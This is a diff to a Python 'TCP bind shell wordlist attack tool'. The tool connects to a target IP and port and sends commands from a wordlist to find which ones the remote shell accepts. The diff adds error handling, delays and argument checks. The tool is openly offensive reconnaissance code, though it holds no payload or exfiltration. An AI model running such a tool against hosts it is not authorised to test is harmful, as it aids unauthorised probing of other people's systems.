@@ -26,6 +26,7 @@ def send_req(send_command):
         data=s.recv(1024)
     except Exception as errmsg:
         print(red + "Connection error - {}".format(errmsg))
+        sleep(args.delay)
         return ""
 
     data_readable = data.decode("utf-8")
@@ -39,19 +40,22 @@ def print_statusline(msg: str):
     print_statusline.last_msg = msg
 
 def main():
-    cls()
-    print("\n{}TCP bind shell wordlist attack tool".format(Back.CYAN))
-
-    s.connect((args.tcp_ip, int(args.tcp_port)))
+    try:
+        a = s.connect((args.tcp_ip, int(args.tcp_port)))
+        print("TCP Connection established with {}{}{}:{}{}".format(cyan, args.tcp_ip, white, cyan, args.tcp_port))
+    except Exception as err:
+        print("{}An error occurred when trying to connet to {}:{}".format(red, args.tcp_ip, args.tcp_port))
+        input()
+        main()
 
     try:
         test_commands = open(args.wordlist_file, encoding="utf-8").read().split("\n")
     except Exception as err:
-        print("{}\nCould not open file {} - {}".format(red, args.wordlist_file, err))
+        print("{}Could not open file {} - {}".format(red, args.wordlist_file, err))
         input()
         main()
 
-    print("\n\nLoaded {}{}{} commands from {}{}\n".format(cyan, len(test_commands), Fore.RESET, cyan, args.wordlist_file))
+    print("Loaded {}{}{} commands from {}{}\n".format(cyan, len(test_commands), Fore.RESET, cyan, args.wordlist_file))
 
     found_commands = []
     for command in test_commands:
@@ -59,28 +63,37 @@ def main():
         data_readable = send_req(send_command)
 
         if not args.notfound_msg in data_readable:
-            print("> Found command: {}{}".format(cyan, command))
+            print("> Found command: {}{}{}".format(bright, cyan, command))
             found_commands.append(command)
         else:
             print_statusline("Not found: {}".format(command))
 
-    print("\n\n{}Tried {} commands - Found {}/{}".format(Back.GREEN, len(test_commands), len(found_commands), len(test_commands)))
+    print("\n\n{}Available commands: {}/{}".format(Back.GREEN, len(found_commands), len(test_commands)))
+    input()
 
 
-parser = ArgumentParser()
-parser.add_argument("-ip", dest="tcp_ip",
-                    help="*Target ip")
-parser.add_argument("-port", dest="tcp_port",
-                    help="*Target port")
-parser.add_argument("-w", dest="wordlist_file",
-                    help="List of commands to try", default="linux-commands-merged.txt")
-parser.add_argument("-errstr", dest="notfound_msg",
-                    help="Console uknown command string", default="No such command")
-parser.add_argument("-delay", dest="delay",
-                    help="Delay after sending command", default=0.25)
+if __name__ == "__main__":
+    cls()
+    print("\n{}TCP bind shell wordlist attack tool\n\n".format(Back.CYAN))
 
-args = parser.parse_args()
-s = socket.socket()
-socket.socket().close()
+    parser = ArgumentParser()
+    parser.add_argument("-ip", dest="tcp_ip",
+                        help="*Target ip")
+    parser.add_argument("-port", dest="tcp_port",
+                        help="*Target port")
+    parser.add_argument("-w", dest="wordlist_file",
+                        help="List of commands to try", default="linux-commands-merged.txt")
+    parser.add_argument("-errstr", dest="notfound_msg",
+                        help="Console uknown command string", default="No such command")
+    parser.add_argument("-delay", dest="delay",
+                        help="Delay after sending command", default=0.25)
 
-main()
+    args = parser.parse_args()
+    s = socket.socket()
+    socket.socket().close()
+
+    if not args.tcp_ip or not args.tcp_port:
+        print(red + "\nYou must provide the IP and port!")
+        exit()
+
+    main()
